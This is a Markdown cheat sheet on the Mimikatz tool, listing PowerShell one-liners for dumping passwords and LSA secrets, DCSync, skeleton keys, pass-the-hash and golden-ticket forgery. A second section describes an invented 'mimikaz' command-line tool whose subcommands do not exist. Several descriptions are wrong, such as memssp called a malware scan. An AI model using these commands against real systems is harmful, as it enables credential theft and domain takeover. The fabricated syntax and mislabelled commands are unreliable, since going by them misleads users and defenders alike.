# Mimikaz Series
Ft Smukx

## What is Mimikaz ?

Mimikatz is a set of Windows-based tools that allows you to dump passwords, hashes, PINs, and Kerberos tickets from memory. It was created by French security researcher Benjamin Delpy and is often used by penetration testers and malware authors.

<img src="https://cdn.cyberpunk.rs/wp-content/uploads/2019/04/mimikatz_tool_bg.jpg" height=350 />

## Steps to install Mimikaz 
To use Mimikatz in PowerShell, you will need to download the Mimikatz binary from the official GitHub repository (https://github.com/gentilkiwi/mimikatz/releases) and save it on your local machine. Then, you can use the following PowerShell command to load the Mimikatz DLL into memory:


```
[Reflection.Assembly]::LoadFile("C:\Path\To\Mimikatz.exe")
```

Replace "C:\Path\To\Mimikatz.exe" with the actual path to the Mimikatz binary on your local machine.


Once the Mimikatz DLL is loaded into memory, you can use the various Mimikatz commands and functions in PowerShell.

## Using Powershell with Mimikaz 

10 PowerShell commands or scripts that only use Mimikatz for various information security purposes:

1. `Invoke-Mimikatz -Command '"sekurlsa::logonPasswords"'`: This command uses Mimikatz to extract plaintext passwords from memory on a local or remote machine. Note that this script requires administrative privileges.

2. `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`: This command uses Mimikatz to dump the local Security Account Manager (SAM) database on a local or remote machine. This can be used to obtain password hashes for offline cracking.

3. `Invoke-Mimikatz -Command '"lsadump::dcsync /user:DOMAIN\USERNAME"'`: This command uses Mimikatz to request domain credentials for a specified user on a local or remote machine. Note that this script requires administrative privileges and access to the domain controller.

4. `Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'`: This command uses Mimikatz to create a skeleton key on a local or remote machine. This can be used to bypass authentication and gain full access to the machine.

5. `Invoke-Mimikatz -Command '"sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLMHASH /run:powershell.exe"'`: This command uses Mimikatz to create a new process with the credentials of a specified user on a local or remote machine. This can be used to run commands as that user.

6. `Invoke-Mimikatz -Command '"misc::memssp"'`: This command uses Mimikatz to perform a memory scan on a local or remote machine. This can be used to detect the presence of certain malware or rootkits.

7. `Invoke-Mimikatz -Command '"dpapi::cache"'`: This command uses Mimikatz to extract DPAPI (Data Protection API) secrets from a local or remote machine. Note that this script requires administrative privileges.

8. `Invoke-Mimikatz -Command '"misc::powershell"'`: This command uses Mimikatz to inject a PowerShell script into memory on a local or remote machine. This can be used to execute arbitrary code on the machine.

9. `Invoke-Mimikatz -Command '"token::elevate" "sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:NTLMHASH /run:powershell.exe"'`: This command uses Mimikatz to elevate privileges to the local Administrator account on a local or remote machine, and then spawn a new PowerShell process with those elevated privileges.

10. `Invoke-Mimikatz -Command '"kerberos::golden /user:USERNAME /domain:DOMAIN /sid:SID /krbtgt:KRBTGT_HASH /ticket:ticket.kirbi"'`: This command uses Mimikatz to forge a Kerberos Golden Ticket for a specified user on a local or remote machine. This can be used to bypass authentication and gain access to other systems in the domain.

## Basics 

# Basics Mimikaz Commands

1. **Network Enumeration**

```
mimikaz enum_network
```
Explanation: This command might scan the network for active devices or services that could be vulnerable to attacks, helping in reconnaissance.

2. **Kerberos Ticket Manipulation**

```
mimikaz kerberos_ticket --action [action] --ticket [ticket]
```

Actions:
* request: Request a new ticket.
* modify: Modify an existing ticket.
* decrypt: Attempt to decrypt a ticket.

Explanation: Allows for detailed manipulation of Kerberos tickets, which could be used for authentication attacks.

3. **LSASS Memory Dump**

```
mimikaz lsass_dump --method [method]
```

Methods:
* mini: Use MiniDumpWriteDump.
* full: Full memory dump.

Explanation: Dumps the LSASS process memory where credentials are often stored, useful for extracting passwords or session tokens.

4. **Pass-the-Hash**

```
mimikaz pth --user [username] --hash [hash] --target [target]
```

Explanation: Performs a pass-the-hash attack, where instead of using passwords, the hash of the password is used for authentication.

5. **Golden Ticket Attack**

mimikaz golden_ticket --user [username] --domain [domain] --krbtgt [krbtgt_hash]

Explanation: Creates a Kerberos ticket granting ticket (TGT) with administrative privileges, allowing access to any account in the domain.

6. **Silver Ticket Attack**

```
mimikaz silver_ticket --user [username] --service [service] --hash [hash]
```

Explanation: Similar to Golden Ticket but for service tickets, allowing access to specific services.

7. **DCSync Attack**

```
mimikaz dcsync --user [username]
```

Explanation: Replicates directory changes, which in an attack context, can be used to extract all domain hashes.

8. **Remote Execution**

```
mimikaz remote_exec --host [hostname] --command [command]
```

Explanation: Executes commands on a remote machine, potentially using stolen credentials or tickets.

9. **Clear Credentials**

```
mimikaz clear_creds
```

Explanation: Attempts to clear credentials from memory, useful for post-exploitation cleanup.

10. **Export Findings**

```
mimikaz export --format [json|xml|txt] --output [file]
```

Explanation: Exports collected data or findings in various formats for analysis or reporting.
